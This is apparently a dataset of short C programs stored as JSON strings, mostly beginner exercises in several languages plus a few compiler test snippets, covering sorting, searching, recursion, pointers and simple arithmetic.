    "#include <stdio.h>\nint main() {\n    double a, b, c;\n    while(scanf(\"%lf %lf %lf\", &a, &b, &c) != (-1)){\n        if(a + b > c && a + c > b && b + c > a && a > 0 && b > 0 && c > 0) printf(\"1\\n\");\n        else printf(\"0\\n\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n        int n, m;\n        printf (\"Podaj liczb\u0119 ca\u0142kowit\u0105 n: \");\n        scanf(\"%d\", &n);\n        printf (\"Podaj liczb\u0119\u00a0ca\u0142kowit\u0105 m: \");\n        scanf(\"%d\", &m);\n        for (int i = n; i < m; i += n)\n                printf(\"%d\\n\", i);\n        return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    int T;\n    scanf(\"%d\",&T);\n    while(T--) {\n        long r;\n        scanf(\"%ld\",&r);\n        printf(\"%0.2lf\\n\",r*r*((((4*1.73 - 5)*3.14) - 3*1.73)/2));\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int n,sum=0,i=0;\n do{\n scanf(\"%d\",&n);\n }while(n<=0 || n>=10000);\n while(n!=0){\n sum=sum+n%10;\n n=n/10;\n i++;\n }\n if(sum/i>7){\n printf(\"heavy\");\n }\n else{\n printf(\"light\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid sortBolha(int *dados);\nint main(int argc, char** argv) {\n    int vetor[5], i;\n    for(i=0; i<5; i++){\n        printf(\"informe um numero:\\n\");\n        scanf(\"%d\", &vetor[i]);\n    }\n    sortBolha(vetor);\n    for(i=0; i<5; i++){\n        printf(\"Numero: %d \\n\", vetor[i]);\n    }\n    return (0);\n}\nvoid sortBolha(int *dados){\n    int i,j, aux;\n    for(i=5 -1; i>=1; i--){\n        for(j=0; j<i; j++){\n            if(dados[j] > dados[j+1]){\n                aux = dados[j];\n                dados[j] = dados[j+1];\n                dados[j+1] = aux;\n            }\n        }\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main (){\n int i;\n for (i = 1; i <= 100; i++ ){\n  printf(\"%d\", i);\n  printf(\"\\t\");}\n printf(\"\\n\");\nreturn 0;}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n    char *buf;\n    buf = malloc(1);\n    if(argc != 2 && argc != 3){\n        fprintf((stderr), \"only one argument! (optional -v) \\n\");\n exit(1);\n    }\n    int readed = 0;\n    int i = 0;\n    while(!feof((stdin))){\n        readed = fread(buf, sizeof(char), sizeof(char), (stdin));\n        if(feof((stdin))) {\n            break;\n        }\n if(argc == 3){\n     if(!strcmp(argv[2], \"-v\")){\n         fprintf((stderr),\"read=%d\\n\", readed);\n     }\n }\n        buf[0] = buf[0] ^ argv[1][i];\n        fwrite(buf, sizeof(char), sizeof(char), (stdout));\n        i++;\n        if(argv[1][i] == '\\0'){\n            i = 0;\n        }\n    }\n    free(buf);\n    return 0;\n}",
    "#include <stdio.h>\n\nstatic void print(int pos[])\n{\n    static int count = 0;\n    count++;\n    printf(\"Solution %3d:\\n\", count);\n    for (int i = 0; i < 8; ++i) {\n        for (int j = 0; j < 8; ++j) {\n            putchar(pos[i] == j ? 'O' : '+');\n            putchar(' ');\n        }\n        putchar('\\n');\n    }\n}\nstatic void putQueenInLine(int pos[], int line)\n{\n    if (line < 8) {\n        for (int i = 0; i < 8; i++) {\n            int j;\n            for (j = 0; j < line; j++) {\n                if (i == pos[j] || i - pos[j] == line - j || pos[j] - i == line - j) {\n                    break;\n                }\n            }\n            if (j == line) {\n                pos[line] = i;\n                putQueenInLine(pos, line + 1);\n            }\n        }\n    } else {\n        print(pos);\n    }\n}\nint main(void)\n{\n    int pos[8];\n    putQueenInLine(pos, 0);\n    return 0;\n}",
    "#include <stdio.h>\nint power(int base, int exponenet);\nint main() {\n    printf(\"%d\\n\", power(2, 3));\n    printf(\"%d\\n\", power(3, 3));\n    for(int i = 0; i < 10; ++i) {\n        printf(\"exponent: %d base: 2 => %d base: -3 => %d\\n\", i, power(2,i), power(-3,i));\n    }\n    return 0;\n}\nint power(int base, int exponenet) {\n    int total = 1;\n    for(int i = 1; i <= exponenet; ++i) {\n        total = total * base;\n    }\n    return total;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void){\n int *iPuntero,\n  iContador,\n  iNumeroX,\n  iNumeroY;\n printf(\"Ingresa el tama%co del arreglo: \",164);\n scanf(\"%d\",&iNumeroX);\n iPuntero = (int*) malloc(iNumeroX * sizeof(int));\n printf(\"\\nDirecci%cn de memoria reservada: \",162);\n for(iContador = 0; iContador < iNumeroX; iContador++){\n  printf(\"\\n%u\\t%p\\n\", *iPuntero + iContador, &iPuntero + iContador);\n }\n printf(\"\\nIngresa el nuevo tama%co del arreglo: \",164);\n scanf(\"%d\",&iNumeroY);\n iPuntero = realloc(iPuntero, iNumeroY * sizeof(int));\n printf(\"\\nNueva direcci%cn de memoria reservada: \",162);\n for(iContador = 0; iContador < iNumeroY; iContador++){\n  printf(\"\\n%u\\t%p\\n\", *iPuntero + iContador, &iPuntero + iContador);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int num = 5;\n    printf(\"Number = %d\", num);\n    if (num > 3 && num < 10) {\n        printf(\"%d is greater than 3 and smaller than 10\\n\",num);\n    } else {\n        printf(\"!!ERROR!!\\n\");\n    }\n    if (num > 10 || num > 3) {\n        printf(\"%d is greater than 10 or greater than 3\\n\",num);\n    } else {\n        printf(\"!!ERROR!!\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint *iPtr;\nvoid getnum(){\n    int number;\n    printf(\"Enter number: \");\n    scanf(\"%d\", &number);\n    iPtr = &number;\n}\nvoid replacenum(){\n    int x = -1;\n}\nint main(){\n    printf(\"iPtr: %p\\n\", iPtr);\n    getnum();\n    printf(\"B *iPtr: %d\\n\", *iPtr);\n    printf(\"B iPtr: %p\\n\", iPtr);\n    replacenum();\n    printf(\"A *iPtr: %d\\n\", *iPtr);\n    printf(\"A iPtr: %p\\n\", iPtr);\n    return -1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main(void)\n{\n int n1=5;\n double n2=2.2;\n printf(\"%d^3=%d\\n%.1lf^3=%lf\\n\",n1,n1*n1*n1,n2,n2*n2*n2);\n system(\"pause\");\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n    printf(\"No libtool needed to compile this program!\\n\");\n    return 0;\n}",
    "int main() {\n  int a,b;\n  *&a = 0;\n  b = *&a;\n}",
    "#include <stdio.h>\nint main(){\n    int num, reverse=0, divisor, residuo;\n    printf(\"Dame un numero para ver si es palindromo o no\\n\");\n    scanf(\"%d\",&num);\n    divisor=num;\n    while(divisor!=0){\n        residuo=divisor%10;\n        reverse=reverse*10+residuo;\n        divisor=divisor/10;\n    }\n    if (reverse==num){\n        printf(\"ES PALINDROMO\");\n    }else{\n        printf(\"No es palindromo\");\n    }\n    return 0;\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <string.h>\n_Bool isAnagram(char *s, char *t) {\n  int slen = strlen(s);\n  int tlen = strlen(t);\n  if (slen == 0 && tlen == 0) {\n    return 1;\n  } else if (slen == 0) {\n    return 0;\n  } else if (tlen == 0) {\n    return 0;\n  }\n  if (slen != tlen) {\n    return 0;\n  }\n  int s_cnt[256] = {0};\n  int t_cnt[256] = {0};\n  for (int i = 0; i < tlen; i++) {\n    s_cnt[(int)s[i]] += 1;\n    t_cnt[(int)t[i]] += 1;\n  }\n  for (int i = 0; i < 256; i++) {\n    if (s_cnt[i] != t_cnt[i]) {\n      return 0;\n    }\n  }\n  return 1;\n}\nint main() {\n  char s[] = \"ac\";\n  char t[] = \"bb\";\n  if (isAnagram(s, t)) {\n    printf(\"%s is %s anagram.\", s, t);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int gsi, group_id, pub_code, item_num, check_digit;\n    printf(\"Enter ISBN: \");\n    scanf(\"%d -%d -%d -%d -%d\",\n          &gsi, &group_id, &pub_code, &item_num, &check_digit);\n    printf(\"GSI prefix: %d\\nGroup identifier: %d\\n\", gsi, group_id);\n    printf(\"Publisher code: %d\\nItem number: %d\\nCheck digit: %d\\n\",\n           pub_code, item_num, check_digit);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    long long h,a,s,c;\n    double bul;\n    while(scanf(\"%lld %lld\", &h, &a) == 2){\n        scanf(\"%lf\",&bul);\n        long double t1 = (long double)h/a,t2;\n        for(s=1; ;s++)\n        {\n            c = (long long)(t1*s);\n            while(h*s>=a*c)\n                c++;\n            t2 = (long double)c/s;\n            if(t2-t1<=bul){\n                printf(\"%lld %lld\\n\",c,s);\n                break;\n            }\n        }\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint a[10];\nint true[11];\nvoid AllRange(int exp,int n)\n{\n int i;\n if(exp==n)\n {\n  for(i=0;i<n;i++) printf(\"%d \",a[i]);\n  printf(\"\\n\");\n  return;\n }\n for(i=1;i<=n;i++)\n {\n  if(true[i]==0)\n  {\n   true[i]=1;\n   a[exp]=i;\n   AllRange(exp+1,n);\n   true[i]=0;\n  }\n }\n}\nint main()\n{\n int n;\n scanf(\"%d\",&n);\n AllRange(0,n);\n return 0;\n}",
    "int foo() { return 5; }\nint bar(int X) { return X; }\nint main() {\n#pragma spf transform inline\n  int X = bar(foo()) + foo();\n  return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint marks_summation(int *marks, int number_of_students, char gender) {\n  int sum = 0;\n  switch (gender) {\n  case 'b': {\n    for (int index = 0; index < number_of_students; index += 2) {\n      sum += marks[index];\n    }\n  } break;\n  case 'g': {\n    for (int index = 1; index < number_of_students; index += 2) {\n      sum += marks[index];\n    }\n  } break;\n  default:\n    break;\n  }\n  return sum;\n}\nint main() {\n  int number_of_students;\n  char gender;\n  int sum;\n  scanf(\"%d\", &number_of_students);\n  int *marks = (int *)malloc(number_of_students * sizeof(int));\n  for (int student = 0; student < number_of_students; student++) {\n    scanf(\"%d\", (marks + student));\n  }\n  scanf(\" %c\", &gender);\n  sum = marks_summation(marks, number_of_students, gender);\n  printf(\"%d\", sum);\n  free(marks);\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int val = 0, d_val = -1;\n    scanf(\"%i\", &val);\n    while(val > 0) {\n        if (d_val < (val % 10)) {\n            d_val = val % 10;\n        };\n        val /= 10;\n    }\n    printf(\"%i\", d_val);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n\n\n\n\n\nint main(int argc, char* argv[]){\n    if(argc > 1)\n        return 1;\n    int tokenCnt = 0;\n    int cmdCnt = 0;\n    char* commandsStr = malloc(sizeof(char) * 200);\n    char** commands = malloc(sizeof(char*) * 10);\n    char*** tokens = malloc(sizeof(char*) * 10);\n    for (int i = 0; i< 10; i++) {\n         tokens[i] = (char **) malloc(200*sizeof(char **));\n          for (int j = 0; j < 200; j++) {\n              tokens[i][j] = (char *)malloc(200*sizeof(char *));\n          }\n    }\n    char* validOp = fgets(commandsStr,200*10, (stdin));\n    if(validOp == ((void*)0))\n        return 2;\n    commands[cmdCnt] = strtok(commandsStr, \";|\");\n    cmdCnt++;\n    while(1){\n        commands[cmdCnt] = strtok(((void*)0), \";|\");\n        if(commands[cmdCnt] == ((void*)0))\n            break;\n        cmdCnt++;\n    }\n    for (int i = 0; i < cmdCnt; i++)\n    {\n        commandsStr = commands[i];\n        tokenCnt = 0;\n        tokens[i][tokenCnt] = strtok(commandsStr, \" \");\n        tokenCnt++;\n        while (1)\n        {\n            tokens[i][tokenCnt] = strtok(((void*)0), \" \");\n            if (tokens[i][tokenCnt] == ((void*)0))\n                break;\n            tokenCnt++;\n        }\n    }\n    for(int i = 0; i < cmdCnt; i++){\n        int j = 0;\n        do{\n            char* currToken = tokens[i][j];\n            if(currToken == ((void*)0))\n                break;\n            printf(\"%s \", currToken);\n            j++;\n        }while(1);\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include<stdio.h>\n\nint main(){\n    int i , contador = 0 ;\n    char gabarito[10],respostas[10];\n    for(i=0 ; i< 10 ; i++){\n        printf(\"digite o gabarito da questao %d : \", i + 1);\n        scanf(\"%d\",&gabarito[i]);\n    }\n    for(i=0 ; i< 10 ; i++){\n        printf(\"digite o respostas da questao %d : \", i + 1);\n        scanf(\"%d\",&respostas[i]);\n    }\n    for(i=0 ; i< 10 ; i++){\n        if(gabarito[i]== respostas[i]){\n            contador = contador + 1 ;\n        }\n    }\n    if( contador >= 7){\n        printf(\"aprovado\");\n    }else{\n        printf(\"reprovado\");\n    }\n    return 0 ;\n}",
    "#include<stdio.h>\nint main(){\nint n, i=0,a[100],b=0;\nscanf(\"%d\", &n);\nwhile(i<n){\nscanf(\"%d\", &a[i]);\nif(a[i]%2!=0){\ni++;\n}\n}\nif(n%2==0){\nfor(i=0;i<n/2;i++){\nb=a[i]-a[(n-1)-i];\nprintf(\"%d\\n\", b);\n}\n}else{\nn--;\nfor(i=0;i<n/2;i++){\nb=a[i]-a[n-i];\nprintf(\"%d\\n\", b);\n}\nprintf(\"%d\", a[i]);\n}\nreturn 0;\n}",
    "#include <stdio.h>\n\nfloat dotprod(float b[200], float c[200])\n{\n    int i;\n    float a=0;\n    for(i=0; i<200; ++i)\n    {\n        a += b[i] * c[i] ;\n    }\n    return a;\n}\nint main()\n{\n    float a,b[200],c[200];\n    int i;\n    for(i=0;i<200;i++)\n    {\n        b[i]=i;\n        c[i]=200 -i;\n    }\n    a=dotprod(b,c);\n    printf(\"%f\",a);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int ary[10] = {10, 21, 32, 43, 54, 65, 76, 87, 98, 99};\n int i;\n for (i = 0; i < 10; i ++)\n {\n     printf(\"\\ni=%d,ary[i]=%d,*(ary+i)=%d\", i, ary[i], *(ary + i));\n     printf(\"&ary[i]=%X,ary+i=%X\", &ary[i],ary+i);\n }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid lerA(double **matrizA, int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            scanf(\"%lf\", &matrizA[i][j]);\n        }\n    }\n}\nvoid lerB(double *vetorB, int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        scanf(\"%lf\", &vetorB[i]);\n    }\n}\ndouble soma(double **matrizA, double *vetorX, int i, int n, int constante)\n{\n    if (i + 1 == n)\n    {\n        return 0;\n    }\n    else\n    {\n        double res = matrizA[constante][i + 1] * vetorX[i + 1] + soma(matrizA, vetorX, i + 1, n, constante);\n        return res;\n    }\n}\nvoid triangular(double **matrizA, double *vetorB, double *vetorX, int n)\n{\n    for (int i = n - 1; i >= 0; i--)\n    {\n        vetorX[i] = (vetorB[i] - soma(matrizA, vetorX, i, n, i)) / matrizA[i][i];\n    }\n}\nvoid printar(double *vetorX, int n)\n{\n    printf(\"Resposta:\\n\");\n    for (int i = 0; i < n; i++)\n    {\n        printf(\"%lf\\n\", vetorX[i]);\n    }\n}\nvoid gauss(double **matrizA, double *vetorB, int n)\n{\n    int i, j, k;\n    double pivo;\n    for (i = 0; i < n - 1; i++)\n    {\n        for (j = i + 1; j < n; j++)\n        {\n            pivo = -matrizA[j][i] / matrizA[i][i];\n            vetorB[j] = vetorB[j] + pivo * vetorB[i];\n            for (k = 0; k < n; k++)\n            {\n                matrizA[j][k] = matrizA[j][k] + pivo * matrizA[i][k];\n            }\n        }\n    }\n}\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    double **matrizA = malloc(n * sizeof(double));\n    for (int i = 0; i < n; i++)\n    {\n        matrizA[i] = malloc(n * sizeof(double));\n    }\n    double *vetorB = malloc(n * sizeof(double));\n    double *vetorX = malloc(n * sizeof(double));\n    lerA(matrizA, n);\n    lerB(vetorB, n);\n    gauss(matrizA, vetorB, n);\n    triangular(matrizA, vetorB, vetorX, n);\n    printar(vetorX, n);\n}",
    "int f(int * restrict p, int * restrict q) {\n      p = q;\n      return 0;\n}\nint main(void){\n      int p = 5;\n      int q = 6;\n      return f(&p, &q);\n}",
    "#include <stdio.h>\nconst float PI=3.14;\nfloat area(float r){\n float result=PI*r*r;\n return result;\n}\nfloat circumfrance(float r){\n float cevap=2*PI*r;\n return cevap;\n}\nint main(){\n float radius=2.1;\n printf(\"area of circle=%f\\n\",area(radius));\n printf(\"Circumfrance ofcircle=%f\\n\",circumfrance(radius));\n return 0;\n}",
    "#include <stdio.h>\nvoid out(int integer_)\n{\n ++integer_;\n printf(\"integer_ = %d\\n\", integer_);\n}\nint main()\n{\n int integer = 4;\n out(integer);\n out(integer);\n return 0;\n}",
    "#include <stdio.h>\nint main (int argc, char* args[])\n{\n    {\n        printf(\"Esempio di input di un dato intero < 10\\n\");\n        printf(\"controllo con messaggio in caso di errore\\n\");\n        int a = 10;\n        do\n        {\n            printf(\"Immetti il valore di a: \");\n            if(scanf(\"%d\", &a) == 0)\n            {\n                scanf(\"%*[^\\n]\");\n                printf(\"Impossibile acquisire il dato\\n\");\n            }\n            else if(a >= 10)\n            {\n                printf(\"Dato errato: a dev'essere < 10\\n\");\n                scanf(\"%*[^\\n]\");\n            }\n        }\n        while(a >= 10);\n        printf(\"Il valore di a accettato e': %d \\n\", a);\n    }\n    {\n        int scelta = -1;\n        do\n        {\n   printf(\"1. Greetings \\n\");\n   printf(\"2. Quote \\n\");\n   printf(\"0. Uscita \\n\");\n            printf(\"Immetti la scelta: \");\n            if(scanf(\"%d\", &scelta) == 0)\n            {\n                scanf(\"%*[^\\n]\");\n                printf(\"scelta non valida\\n\");\n            }\n            else\n            {\n    if(scelta == 1) {\n     printf(\"Ciao, mondo!\\n\");\n    } else if(scelta == 2) {\n     printf(\"I have a dream! (M.L.King)\\n\");\n    } else if(scelta != 0) {\n     printf(\"scelta non valida\\n\");\n    }\n            }\n        }\n        while(scelta != 0);\n        printf(\"Arriverderci!\\n\");\n    }\n {\n  long double number = 2.0;\n  long double oldSqrt, newSqrt = 1.0;\n  do {\n   oldSqrt = newSqrt;\n   newSqrt = (oldSqrt + number / oldSqrt) / 2.0;\n   printf(\"sqrt(2) = %27.24Lf\\n\", newSqrt);\n  } while(oldSqrt != newSqrt);\n  printf(\"Finally sqrt(2) = %27.24Lf\\n\", newSqrt);\n  printf(\"sqrt(2) * sqrt(2) = %27.24Lf\\n\", newSqrt * newSqrt);\n }\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int n;\n n = 10;\n if (n < 30) {\n  printf(\"The number is less then 30\\n\");\n }\n else if (n < 50) {\n  printf(\"The number is less then 50\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n  int x,y,l;\n  printf(\"Enter the x-coordinate of the left bottom vertex\\n\");\n  scanf(\"%d\",&x);\n  printf(\"Enter the y-coordinate of the left bottom vertex\\n\");\n  scanf(\"%d\",&y);\n  printf(\"Enter the length of a side\\n\");\n  scanf(\"%d\",&l);\n  x=x+(l/2);\n  y=y+(l/2);\n  printf(\"The centre of the room is at (%d,%d)\",x,y);\n  return 0;\n}",
    "#include <stdio.h>\nint testaTriangulo(float lado1, float lado2, float lado3);\nint main()\n{\nfloat ladoA, ladoB, ladoC;\nprintf(\"Este programa verifique se tres numeros reais podem representar os lados de um triangulo.\\n\\n\");\nprintf(\"Insira tres medidas para o triangulo: \");\nscanf(\"%f%f%f\", &ladoA, &ladoB, &ladoC);\nint triangulo;\ntriangulo = testaTriangulo(ladoA,ladoB,ladoC);\nif (triangulo == 1)\n{\n  printf(\"\\nCom os lados %.1f, %.1f e %.1f podemos formar um triangulo\", ladoA, ladoB, ladoC);\n}\nelse\nprintf(\"\\nCom os lados %.1f, %.1f e %.1f nao podemos formar um triangulo\", ladoA, ladoB, ladoC);\n return 0;\n}\nint testaTriangulo(float lado1, float lado2, float lado3)\n{\n  if (lado1 < (lado2 + lado3) && lado2 < (lado1 + lado3) && lado3 < (lado1 + lado2))\n  {\n    return 1;\n  }\n  else\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int array[10];\n int i, j;\n char sym;\n for (i = 0; i < 10; i++)\n {\n  printf(\"Enter Integer: \");\n  scanf(\"%d\", &array[i]);\n }\n printf(\"Enter prefered character: \");\n scanf(\" %c\", &sym);\n puts(\"\");\n puts(\"Element\\tValue\\tHistogram\");\n for (i = 0; i < 10; i++)\n {\n  printf(\"%d\\t%d\\t\", i, array[i]);\n  for (j = 0; j < array[i]; j++)\n  {\n   printf(\"%c\", sym);\n  }\n  puts(\"\");\n }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int number=0;\n    printf(\"Enter a number:\");\n    scanf(\"%d\",&number);\n    if(number%2==0){\n        printf(\"%d is even number\",number);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nvoid func(int *a, int *b, int *c, int *largestx, int *smallesty)\n{\n    if(*a > *b && *a > *c){\n        *largestx = *a;\n    }\n    else if(*b > *a && *b > *c){\n        *largestx = *b;\n    }\n    else{\n        *largestx = *c;\n    }\n    if(*a < *b && *a < *c){\n        *smallesty = *a;\n    }\n    else if(*b < *a && *b < *c){\n        *smallesty = *b;\n    }\n    else{\n        *smallesty = *c;\n    }\n}\nint main()\n{\n    int a, b, c;\n    printf(\"Enter three numbers: \\n\");\n    scanf(\"%d %d %d\", &a, &b, &c);\n    int largestx = 0, smallesty = 0;\n    func(&a, &b, &c, &largestx, &smallesty);\n    printf(\"Largest = %d\\n\", largestx);\n    printf(\"Smallest = %d\\n\", smallesty);\n}",
    "#include <stdio.h>\nint main (void)\n{\n    printf(\"%d\", 15+37);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint numRookCaptures(char** board, int boardSize, int* boardColSize){\n    if (board == ((void*)0) || boardSize < 1 || boardColSize == ((void*)0)) { return 0; }\n    int ans = -1, pi = 0, pj = 0;\n    for (int i = 0; i < boardSize; i++) {\n        int colSize = boardColSize[i];\n        for (int j = 0; j < colSize; j++) {\n            if (board[i][j] == 'R') {\n                pi = i; pj = j; ans = 0;\n                break;\n            }\n        }\n        if (ans == 0) { break; }\n    }\n    if (ans == -1) { return 0; }\n    for (int i = pi - 1; i >= 0; i--) {\n        if (board[i][pj] == 'B') {\n            break;\n        } else if (board[i][pj] == 'p') {\n            ans += 1; break;\n        }\n    }\n    for (int i = pi + 1; i < boardSize; i++) {\n        if (board[i][pj] == 'B') {\n            break;\n        } else if (board[i][pj] == 'p') {\n            ans += 1; break;\n        }\n    }\n    for (int j = pj - 1; j >= 0; j--) {\n        if (board[pi][j] == 'B') {\n            break;\n        } else if (board[pi][j] == 'p') {\n            ans += 1; break;\n        }\n    }\n    for (int j = pj + 1; j < boardSize; j++) {\n        if (board[pi][j] == 'B') {\n            break;\n        } else if (board[pi][j] == 'p') {\n            ans += 1; break;\n        }\n    }\n    return ans;\n}\nint main(int argc, const char * argv[]) {\n   char **board = (char **)malloc(sizeof(char *) * 8);\n    board[0] = \"........\";\n    board[1] = \"...p....\";\n    board[2] = \"...p....\";\n    board[3] = \"pp.R.pB.\";\n    board[4] = \"........\";\n    board[5] = \"...B....\";\n    board[6] = \"...p....\";\n    board[7] = \"........\";\n    int boardSize = 8;\n    int boardColSize[8] = {8,8,8,8,8,8,8,8};\n    int a = numRookCaptures(board, boardSize, boardColSize);\n    printf(\"ans = %d\\n\", a);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    char name[20];\n    printf(\"Ingrese su nombre: \");\n    scanf(\"%s\", name);\n    printf(\"Su nombre es %s\\n\", name);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n   printf(\"A regular message on stdout\\n\");\n   fprintf((stdout), \"Also a regular message on \"\n      \"stdout\\n\");\n   fprintf((stderr), \"An error message on stderr\\n\");\n   dprintf(1, \"A regular message, printed to \"\n      \"fd 1\\n\");\n   dprintf(2, \"An error message, printed to \"\n      \"fd 2\\n\");\n   return 0;\n}",
    "#include<stdio.h>\n\nint binarySearch(const int b[], int searchKey, int low, int high);\nvoid printHeader( void );\nvoid printRow(const int b[], int low, int mid, int high);\nint main ( void ) {\n int a[15];\n int i;\n int key;\n int result;\n for(i = 0; i < 15; i++) {\n  a[i] = 2 * i;\n }\n printf(\"Digite um numero entre 0 e 28: \");\n scanf(\"%d\", &key);\n printHeader();\n result = binarySearch( a, key, 0, 15 - 1);\n if( result != -1 ) {\n  printf(\"\\n%d encontrados no elemento de array %d\\n\", key, result);\n } else {\n  printf(\"\\n%d n\u00e3o encontramos\\n\", key);\n }\n}\nint binarySearch(const int b[], int searchKey, int low, int high) {\n int middle;\n while( low <= high ) {\n  middle = ( low + high ) / 2;\n  printRow( b, low, middle, high );\n  if ( searchKey == b[ middle ] ) {\n   return middle;\n  } else if ( searchKey < b[ middle ] ) {\n   high = middle - 1;\n  } else {\n   low = middle + 1;\n  }\n }\n return -1;\n}\nvoid printHeader( void ) {\n int i;\n printf(\"\\nSubscritos:\\n\");\n for(i = 0; i < 15; i++) {\n  printf(\"%3d\", i);\n }\n printf(\"\\n\");\n for(i = 1; i <= 4 * 15; i++) {\n  printf(\"-\");\n }\n printf(\"\\n\");\n}\nvoid printRow(const int b[], int low, int mid, int high) {\n int i;\n for(i = 0; i < 15; i++) {\n  if( i < low || i > high )\n   printf(\" \");\n  else if (i == mid)\n   printf(\"%3d\", b[i]);\n  else\n   printf(\"%3d\", b[i]);\n }\n printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint reach = 0;\nvoid visit(int **maze, int column, int size, int startX, int startY, int endX, int endY) {\n  *((int *)maze + startY * column + startX) = 2;\n  if(startX == endX && startY == endY) {\n    reach = 1;\n  }\n  if(reach != 1 && (startY + 1) < size && *((int *)maze + (startY + 1) * column + startX) == 0) {\n    visit((int **)maze, column, size, startX, (startY + 1), endX, endY);\n  }\n  if(reach != 1 && (startY - 1) >= 0 && *((int *)maze + (startY - 1) * column + startX) == 0) {\n    visit((int **)maze, column, size, startX, (startY - 1), endX, endY);\n  }\n  if(reach != 1 && (startX + 1) < size && *((int *)maze + startY * column + (startX + 1)) == 0) {\n    visit((int **)maze, column, size, (startX + 1), startY, endX, endY);\n  }\n  if(reach != 1 && (startX - 1) >= 0 && *((int *)maze + startY * column + (startX - 1)) == 0) {\n    visit((int **)maze, column, size, (startX - 1), startY, endX, endY);\n  }\n  *((int *)maze + startY * column + startX) = 3;\n}\nint main(int argc, char const *argv[]) {\n  int size;\n  scanf(\"%d\", &size);\n  int maze[size][size];\n  for (int i = 0 ; i < size ; i++) {\n    for (int j = 0 ; j < size ; j++) {\n      scanf(\"%d\", &maze[i][j]);\n    }\n  }\n visit((int **)maze, size, size, 0, 0, size-1, size-1);\n  if(reach) {\n    printf(\"Yes\\n\");\n  }else {\n    printf(\"No\\n\");\n  }\n  return 0;\n}",
    "#include<stdio.h>\nvoid matriz(int a[][100], int n);\nint ampulheta(int a[][100], int n);\nint main() {\n  int n;\n  int a[100][100];\n  scanf(\"%d\", &n);\n  matriz(a, n);\n  printf(\"%d\\n\", ampulheta(a,n));\n  return 0;\n  }\n  void matriz(int a[][100], int n){\n    int i, j;\n    for(i=0; i<n; i++) {\n      for(j=0; j<n; j++){\n        scanf(\"%d\", &a[i][j]);\n      }\n    }\n  }\n  int ampulheta(int a[][100], int n){\n    int i, j, sum=0, maior=0;\n    for(i=0;i<n-2;i++){\n      for(j=0;j<n-2;j++){\n        sum = a[i][j]+a[i][j+1]+a[i][j+2]+a[i+1][j+1]+a[i+2][j]+a[i+2][j+1]+a[i+2][j+2];\n        if(sum>=0 && sum>maior){\n          maior=sum;\n        } else if(sum<0 && -sum>maior){\n          maior=sum;\n        }\n      }\n    }\n    return maior;\n  }",
    "#include <stdio.h>\nint main () {\n int a , b;\n printf(\"Por favor, entre com valores inteiros para as variaveis A e B:\\n\");\n printf(\"A= \");\n scanf(\"%d\" , &a);\n printf(\"B= \");\n scanf(\"%d\" , &b);\n printf(\"\\nOs valores invertidos das variaveis s\u00e3o: %d e %d\" , b , a);\nreturn 0; }",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar* sottostr(char s[], int k)\n{\n int i, len;\n char *res;\n len = strlen(s);\n res = malloc(sizeof(char)*(k+1));\n if(res) {\n  for(i=0;i<k;i++) {\n   if(len-i>0) {\n    res[i] = s[i];\n   }\n   else {\n    res[i] = s[len-1];\n   }\n  }\n  res[i] = '\\0';\n }\n else {\n  printf(\"Errore allocazione memoria\\n\");\n }\n return res;\n}\nint main(void)\n{\n char frase[50], *ris;\n int k;\n printf(\"Inserisci frase: \");\n scanf(\" %[^\\n]\", frase);\n printf(\"Inserisci k: \");\n scanf(\"%d\", &k);\n ris = sottostr(frase, k);\n printf(\"\\n%s\\n\", ris);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    double area, p, raio;\n p = 3.14159;\n    scanf(\"%lf\", &raio);\n    area = p * pow(raio,2);\n    printf(\"A=%.4f\\n\", area);\n    return 0;\n}",
    "int foo(int a, int b, int c) {\n  int arr[5] = { 1, 2, 3, 4, 5 };\n  int d = 4;\n  int *p = &d;\n  return a + b + c + arr[4] + arr[0] + *p;\n}\nint main() {\n  int a, b, c;\n  a = 2;\n  b = 1;\n  c = 3;\n  int d = 4;\n  int *p = &d;\n  int i;\n  for (i = 0; i < 12345; i++) {\n    *p = foo(a, b, c);\n  }\n  return *p;\n}",
